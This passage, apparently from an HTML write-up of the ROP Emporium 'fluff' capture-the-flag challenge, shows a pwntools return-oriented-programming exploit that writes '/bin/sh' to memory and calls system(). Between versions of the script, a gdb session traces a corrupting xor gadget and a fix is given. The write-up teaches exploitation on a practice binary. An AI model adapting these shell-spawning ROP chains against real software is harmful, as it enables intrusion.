+                pop_rdi_ret&nbsp;=&nbsp;p64(<span style="color:#ff0044;font-weight:400">0x004008c3</span>)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;pop&nbsp;rdi;&nbsp;ret;</span><br>
+                system_addr&nbsp;=&nbsp;p64(<span style="color:#ff0044;font-weight:400">0x004005e0</span>)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;rabin2&nbsp;-i&nbsp;fluff</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;---------&nbsp;EXPLOIT&nbsp;---------</span><br>
+                payload&nbsp;&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"A"</span>*<span style="color:#ff0044;font-weight:400">40</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;part&nbsp;1&nbsp;-&nbsp;Put&nbsp;writable&nbsp;memory&nbsp;address&nbsp;into&nbsp;r10</span><br>
+                payload&nbsp;+=&nbsp;xor_r11_r11_pop_mov_ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;set&nbsp;r11&nbsp;to&nbsp;0</span><br>
+                payload&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"D"</span>*<span style="color:#ff0044;font-weight:400">8</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;junk&nbsp;to&nbsp;pop&nbsp;into&nbsp;r14</span><br>
+                <br>
+                payload&nbsp;+=&nbsp;pop_r12_mov_ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                payload&nbsp;+=&nbsp;data_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;pop&nbsp;writable&nbsp;memory&nbsp;address&nbsp;into&nbsp;r12</span><br>
+                <br>
+                payload&nbsp;+=&nbsp;xor_r11_r12_pop_mov_ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;xor&nbsp;r11,&nbsp;r12&nbsp;(r11&nbsp;now&nbsp;contains&nbsp;writable&nbsp;memory&nbsp;address)</span><br>
+                payload&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"B"</span>*<span style="color:#ff0044;font-weight:400">8</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;junk&nbsp;to&nbsp;pop&nbsp;into&nbsp;r12</span><br>
+                <br>
+                payload&nbsp;+=&nbsp;xchg_r11_r10_pop_mov_ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;exchange&nbsp;r11&nbsp;with&nbsp;r10&nbsp;(r10&nbsp;now&nbsp;holds&nbsp;writable&nbsp;address)</span><br>
+                payload&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"E"</span>*<span style="color:#ff0044;font-weight:400">8</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;junk&nbsp;to&nbsp;pop&nbsp;into&nbsp;r15</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;part&nbsp;2&nbsp;-&nbsp;Put&nbsp;"/bin/sh\x00"&nbsp;string&nbsp;into&nbsp;r11</span><br>
+                payload&nbsp;+=&nbsp;xor_r11_r11_pop_mov_ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;set&nbsp;r11&nbsp;to&nbsp;0</span><br>
+                payload&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"D"</span>*<span style="color:#ff0044;font-weight:400">8</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;junk&nbsp;to&nbsp;pop&nbsp;into&nbsp;r14</span><br>
+                <br>
+                payload&nbsp;+=&nbsp;pop_r12_mov_ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                payload&nbsp;+=&nbsp;binsh_hex&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;pop&nbsp;"/bin/sh\x00"&nbsp;string&nbsp;into&nbsp;r12</span><br>
+                <br>
+                payload&nbsp;+=&nbsp;xor_r11_r12_pop_mov_ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;xor&nbsp;r11,&nbsp;r12&nbsp;(r11&nbsp;now&nbsp;contains&nbsp;/bin/sh&nbsp;string)</span><br>
+                payload&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"B"</span>*<span style="color:#ff0044;font-weight:400">8</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;junk&nbsp;to&nbsp;pop&nbsp;into&nbsp;r12</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;part&nbsp;3&nbsp;-&nbsp;Write&nbsp;"/bin/sh\x00"&nbsp;to&nbsp;memory</span><br>
+                payload&nbsp;+=&nbsp;mov_pop_pop_xor_ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;write&nbsp;"/bin/sh\x00"&nbsp;to&nbsp;memory&nbsp;address</span><br>
+                payload&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"C"</span>*<span style="color:#ff0044;font-weight:400">8</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;junk&nbsp;to&nbsp;pop&nbsp;into&nbsp;r13</span><br>
+                payload&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"B"</span>*<span style="color:#ff0044;font-weight:400">8</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;junk&nbsp;to&nbsp;pop&nbsp;into&nbsp;r12</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;part&nbsp;4&nbsp;-&nbsp;run&nbsp;system("/bin/sh")</span><br>
+                payload&nbsp;+=&nbsp;pop_rdi_ret<br>
+                payload&nbsp;+=&nbsp;data_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;pop&nbsp;address&nbsp;of&nbsp;string&nbsp;into&nbsp;rdi</span><br>
+                payload&nbsp;+=&nbsp;system_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;run&nbsp;system()</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#payload&nbsp;+=&nbsp;"B"*5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;crash</span><br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">print</span>&nbsp;payload
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-11" name="h2-11"></a><strong></strong>
+        <h2><strong>7) Mischevious Gadget</strong></h2><br>
+        If you run the exploit against the binary, you'll discover that it doesn't work.<br>
+            <div class="codebox">
+                root@city64:~/ctf/ropemporium/fluff#&nbsp;(python&nbsp;fluff.py;&nbsp;cat)&nbsp;|&nbsp;./fluff<br>
+                fluff&nbsp;by&nbsp;ROP&nbsp;Emporium<br>
+                64bits<br>
+                <br>
+                You&nbsp;know&nbsp;changing&nbsp;these&nbsp;strings&nbsp;means&nbsp;I&nbsp;have&nbsp;to&nbsp;rewrite&nbsp;my&nbsp;solutions...<br>
+                &gt;&nbsp;sh:&nbsp;1:&nbsp;mbin/sh:&nbsp;not&nbsp;found<br>
+                id<br>
+                Segmentation&nbsp;fault
+            </div>
+        </div><br>
+        <br>
+        At first glance, the exploit looks fine.<br>
+        What's messing up our exploit is a trailing instruction from one of our gadgets.<br>
+        <br>
+        Modify the script above to have the binary crash instead of calling system().<br>
+            <div class="codebox">
+                ...<br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;part&nbsp;4&nbsp;-&nbsp;run&nbsp;system("/bin/sh")</span><br>
+                payload&nbsp;+=&nbsp;pop_rdi_ret<br>
+                payload&nbsp;+=&nbsp;data_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;pop&nbsp;address&nbsp;of&nbsp;string&nbsp;into&nbsp;rdi</span><br>
+                <span style="color:#0088ff;font-weight:400">#payload&nbsp;+=&nbsp;system_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;run&nbsp;system()</span><br>
+                <br>
+                payload&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"B"</span>*<span style="color:#ff0044;font-weight:400">5</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;crash</span><br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">print</span>&nbsp;payload
+            </div>
+        </div><br>
+        <br>
+        Output the payload to a text file and exploit the binary in gdb.<br>
+            <div class="codebox">
+                root@city64:~/ctf/ropemporium/fluff#&nbsp;python&nbsp;fluff.py&nbsp;&gt;&nbsp;pwn.txt<br>
+                root@city64:~/ctf/ropemporium/fluff#&nbsp;gdb&nbsp;-q&nbsp;fluff<br>
+                ...<br>
+                gdb-peda$&nbsp;r&nbsp;&lt;&nbsp;pwn.txt<br>
+                Starting&nbsp;program:&nbsp;/root/ctf/ropemporium/fluff/fluff&nbsp;&lt;&nbsp;pwn.txt<br>
+                fluff&nbsp;by&nbsp;ROP&nbsp;Emporium<br>
+                64bits<br>
+                <br>
+                You&nbsp;know&nbsp;changing&nbsp;these&nbsp;strings&nbsp;means&nbsp;I&nbsp;have&nbsp;to&nbsp;rewrite&nbsp;my&nbsp;solutions...<br>
+                &gt;&nbsp;<br>
+                Program&nbsp;received&nbsp;signal&nbsp;SIGSEGV,&nbsp;Segmentation&nbsp;fault.<br>
+                <br>
+                [----------------------------------registers-----------------------------------]<br>
+                RAX:&nbsp;0x7fffffffe140&nbsp;('A'&nbsp;&lt;repeats&nbsp;40&nbsp;times&gt;,&nbsp;"\"\b@")<br>
+                RBX:&nbsp;0x0&nbsp;<br>
+                RCX:&nbsp;0xfbad2088&nbsp;<br>
+                RDX:&nbsp;0x7fffffffe140&nbsp;('A'&nbsp;&lt;repeats&nbsp;40&nbsp;times&gt;,&nbsp;"\"\b@")<br>
+                RSI:&nbsp;0x7ffff7fad8d0&nbsp;--&gt;&nbsp;0x0&nbsp;<br>
+                RDI:&nbsp;0x601050&nbsp;--&gt;&nbsp;0x68732f6e69626d&nbsp;('mbin/sh')<br>
+                RBP:&nbsp;0x4141414141414141&nbsp;('AAAAAAAA')<br>
+                RSP:&nbsp;0x7fffffffe208&nbsp;--&gt;&nbsp;0x7ffff7fe4406&nbsp;(&lt;_dl_init+118&gt;: cmp&nbsp;&nbsp;&nbsp;&nbsp;ebx,0xffffffff)<br>
+                RIP:&nbsp;0xa4242424242&nbsp;('BBBBB\n')<br>
+                R8&nbsp;:&nbsp;0x602326&nbsp;--&gt;&nbsp;0x0&nbsp;<br>
+                R9&nbsp;:&nbsp;0x77&nbsp;('w')<br>
+                R10:&nbsp;0x601050&nbsp;--&gt;&nbsp;0x68732f6e69626d&nbsp;('mbin/sh')<br>
+                R11:&nbsp;0x68732f6e69622f&nbsp;('/bin/sh')<br>
+                R12:&nbsp;0x4242424242424242&nbsp;('BBBBBBBB')<br>
+                R13:&nbsp;0x4343434343434343&nbsp;('CCCCCCCC')<br>
+                R14:&nbsp;0x4444444444444444&nbsp;('DDDDDDDD')<br>
+                R15:&nbsp;0x4545454545454545&nbsp;('EEEEEEEE')<br>
+                EFLAGS:&nbsp;0x10202&nbsp;(carry&nbsp;parity&nbsp;adjust&nbsp;zero&nbsp;sign&nbsp;trap&nbsp;INTERRUPT&nbsp;direction&nbsp;overflow)<br>
+                [-------------------------------------code-------------------------------------]<br>
+                Invalid&nbsp;$PC&nbsp;address:&nbsp;0xa4242424242<br>
+                [------------------------------------stack-------------------------------------]<br>
+                0000|&nbsp;0x7fffffffe208&nbsp;--&gt;&nbsp;0x7ffff7fe4406&nbsp;(&lt;_dl_init+118&gt;: cmp&nbsp;&nbsp;&nbsp;&nbsp;ebx,0xffffffff)<br>
+                0008|&nbsp;0x7fffffffe210&nbsp;--&gt;&nbsp;0x0&nbsp;<br>
+                0016|&nbsp;0x7fffffffe218&nbsp;--&gt;&nbsp;0x0&nbsp;<br>
+                0024|&nbsp;0x7fffffffe220&nbsp;--&gt;&nbsp;0x400650&nbsp;(&lt;_start&gt;: xor&nbsp;&nbsp;&nbsp;&nbsp;ebp,ebp)<br>
+                0032|&nbsp;0x7fffffffe228&nbsp;--&gt;&nbsp;0x7fffffffe250&nbsp;--&gt;&nbsp;0x1&nbsp;<br>
+                0040|&nbsp;0x7fffffffe230&nbsp;--&gt;&nbsp;0x0&nbsp;<br>
+                0048|&nbsp;0x7fffffffe238&nbsp;--&gt;&nbsp;0x400679&nbsp;(&lt;_start+41&gt;: hlt)<br>
+                0056|&nbsp;0x7fffffffe240&nbsp;--&gt;&nbsp;0x7fffffffe248&nbsp;--&gt;&nbsp;0x1c&nbsp;<br>
+                [------------------------------------------------------------------------------]<br>
+                Legend:&nbsp;code,&nbsp;data,&nbsp;rodata,&nbsp;value<br>
+                Stopped&nbsp;reason:&nbsp;SIGSEGV<br>
+                0x00000a4242424242&nbsp;in&nbsp;??&nbsp;()
+            </div>
+        </div><br>
+        <br>
+        You'll see that <code>r11</code>, where we copied our "/bin/sh" to initially, contains the string just fine.<br>
+        However, the string pointed to by <code>r10</code> is wrong - <code>mbin/sh</code>.<br>
+        This means that our string is being tampered with when it's being copied into memory.<br>
+        <br>
+        Have a look at the <code>mov</code> gadget and its trailing instructions:<br>
+        <code>mov qword ptr [r10], r11; pop r13; pop r12; xor byte ptr [r10], r12b; ret;</code><br>
+        <br>
+        The problem is <code>xor [r10], r12b</code>.<br>
+        The data pointed to by <code>r10</code> - our "/bin/sh" string - is being xor'ed with lowest 8 bits of the <code>r12</code> register, which in my exploit is <code>B</code>.<br>
+        This is what's causing our <code>/bin/sh</code> string to modified to <code>mbin/sh</code>.<br>
+        <br>
+        To get around this, using the <code>pop r12</code> instruction just before the <code>xor [r10], r12b</code>, we can pop <code>0</code> into r12.<br>
+        This means that <code>/bin/sh</code> will be xor'ed with <code>0</code>, and the string won't change.<br>
+        <br>
+            <div class="codebox">
+                <span style="color:#0088ff;font-weight:400">#&nbsp;part&nbsp;3&nbsp;-&nbsp;Write&nbsp;"/bin/sh\x00"&nbsp;to&nbsp;memory</span><br>
+                payload&nbsp;+=&nbsp;mov_pop_pop_xor_ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;write&nbsp;"/bin/sh\x00"&nbsp;to&nbsp;memory&nbsp;address</span><br>
+                payload&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"C"</span>*<span style="color:#ff0044;font-weight:400">8</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;junk&nbsp;to&nbsp;pop&nbsp;into&nbsp;r13</span><br>
+                payload&nbsp;+=&nbsp;p64(<span style="color:#ff0044;font-weight:400">0x0</span>)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;junk&nbsp;to&nbsp;pop&nbsp;into&nbsp;r12&nbsp;-&nbsp;xor&nbsp;key&nbsp;of&nbsp;0</span>
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-12" name="h2-12"></a><strong></strong>
+        <h2><strong>8) Write Final Exploit Script</strong></h2><br>
+        Here's my final exploit script.<br>
+            <div class="codebox">
+                <span style="color:#333333;font-weight:400">from</span>&nbsp;pwn&nbsp;<span style="color:#333333;font-weight:400">import</span>&nbsp;*<br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;---------&nbsp;GADGETS&nbsp;---------</span><br>
+                xor_r11_r11_pop_mov_ret&nbsp;=&nbsp;p64(<span style="color:#ff0044;font-weight:400">0x00400822</span>)&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;xor&nbsp;r11,&nbsp;r11;&nbsp;pop&nbsp;r14;&nbsp;mov&nbsp;edi,&nbsp;0x601050;&nbsp;ret;</span><br>
+                pop_r12_mov_ret&nbsp;=&nbsp;p64(<span style="color:#ff0044;font-weight:400">0x00400832</span>)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;pop&nbsp;r12;&nbsp;mov&nbsp;r13d,&nbsp;0x604060;&nbsp;ret;</span><br>
+                data_addr&nbsp;=&nbsp;p64(<span style="color:#ff0044;font-weight:400">0x00601050</span>)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;rabin2&nbsp;-S&nbsp;fluff</span><br>
+                xor_r11_r12_pop_mov_ret&nbsp;=&nbsp;p64(<span style="color:#ff0044;font-weight:400">0x0040082f</span>)&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;xor&nbsp;r11,&nbsp;r12;&nbsp;pop&nbsp;r12;&nbsp;mov&nbsp;r13d,&nbsp;0x604060;&nbsp;ret;</span><br>
+                xchg_r11_r10_pop_mov_ret&nbsp;=&nbsp;p64(<span style="color:#ff0044;font-weight:400">0x00400840</span>)&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;xchg&nbsp;r11,&nbsp;r10;&nbsp;pop&nbsp;r15;&nbsp;mov&nbsp;r11d,&nbsp;0x602050;&nbsp;ret;</span><br>
+                <br>
+                binsh_hex&nbsp;=&nbsp;p64(<span style="color:#ff0044;font-weight:400">0x2f62696e2f736800</span>,&nbsp;endianness=<span style="color:#3ad900;font-weight:400">"big"</span>)&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;/bin/sh\x00</span><br>
+                mov_pop_pop_xor_ret&nbsp;=&nbsp;p64(<span style="color:#ff0044;font-weight:400">0x0040084e</span>)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;mov&nbsp;qword&nbsp;ptr&nbsp;[r10],&nbsp;r11;&nbsp;pop&nbsp;r13;&nbsp;pop&nbsp;r12;&nbsp;xor&nbsp;byte&nbsp;ptr&nbsp;[r10],&nbsp;r12b;&nbsp;ret;</span><br>
+                <br>
+                pop_rdi_ret&nbsp;=&nbsp;p64(<span style="color:#ff0044;font-weight:400">0x004008c3</span>)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;pop&nbsp;rdi;&nbsp;ret;</span><br>
+                system_addr&nbsp;=&nbsp;p64(<span style="color:#ff0044;font-weight:400">0x004005e0</span>)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;rabin2&nbsp;-i&nbsp;fluff</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;---------&nbsp;EXPLOIT&nbsp;---------</span><br>
+                payload&nbsp;&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"A"</span>*<span style="color:#ff0044;font-weight:400">40</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;part&nbsp;1&nbsp;-&nbsp;Put&nbsp;writable&nbsp;memory&nbsp;address&nbsp;into&nbsp;r10</span><br>
+                payload&nbsp;+=&nbsp;xor_r11_r11_pop_mov_ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;set&nbsp;r11&nbsp;to&nbsp;0</span><br>
+                payload&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"D"</span>*<span style="color:#ff0044;font-weight:400">8</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;junk&nbsp;to&nbsp;pop&nbsp;into&nbsp;r14</span><br>
+                <br>
+                payload&nbsp;+=&nbsp;pop_r12_mov_ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                payload&nbsp;+=&nbsp;data_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;pop&nbsp;writable&nbsp;memory&nbsp;address&nbsp;into&nbsp;r12</span><br>
+                <br>
+                payload&nbsp;+=&nbsp;xor_r11_r12_pop_mov_ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;xor&nbsp;r11,&nbsp;r12&nbsp;(r11&nbsp;now&nbsp;contains&nbsp;writable&nbsp;memory&nbsp;address)</span><br>
+                payload&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"B"</span>*<span style="color:#ff0044;font-weight:400">8</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;junk&nbsp;to&nbsp;pop&nbsp;into&nbsp;r12</span><br>
+                <br>
+                payload&nbsp;+=&nbsp;xchg_r11_r10_pop_mov_ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;exchange&nbsp;r11&nbsp;with&nbsp;r10&nbsp;(r10&nbsp;now&nbsp;holds&nbsp;writable&nbsp;address)</span><br>
+                payload&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"E"</span>*<span style="color:#ff0044;font-weight:400">8</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;junk&nbsp;to&nbsp;pop&nbsp;into&nbsp;r15</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;part&nbsp;2&nbsp;-&nbsp;Put&nbsp;"/bin/sh\x00"&nbsp;string&nbsp;into&nbsp;r11</span><br>
+                payload&nbsp;+=&nbsp;xor_r11_r11_pop_mov_ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;set&nbsp;r11&nbsp;to&nbsp;0</span><br>
+                payload&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"D"</span>*<span style="color:#ff0044;font-weight:400">8</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;junk&nbsp;to&nbsp;pop&nbsp;into&nbsp;r14</span><br>
+                <br>
+                payload&nbsp;+=&nbsp;pop_r12_mov_ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                payload&nbsp;+=&nbsp;binsh_hex&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;pop&nbsp;"/bin/sh\x00"&nbsp;string&nbsp;into&nbsp;r12</span><br>
+                <br>
+                payload&nbsp;+=&nbsp;xor_r11_r12_pop_mov_ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;xor&nbsp;r11,&nbsp;r12&nbsp;(r11&nbsp;now&nbsp;contains&nbsp;/bin/sh&nbsp;string)</span><br>
+                payload&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"B"</span>*<span style="color:#ff0044;font-weight:400">8</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;junk&nbsp;to&nbsp;pop&nbsp;into&nbsp;r12</span><br>
+                <br>
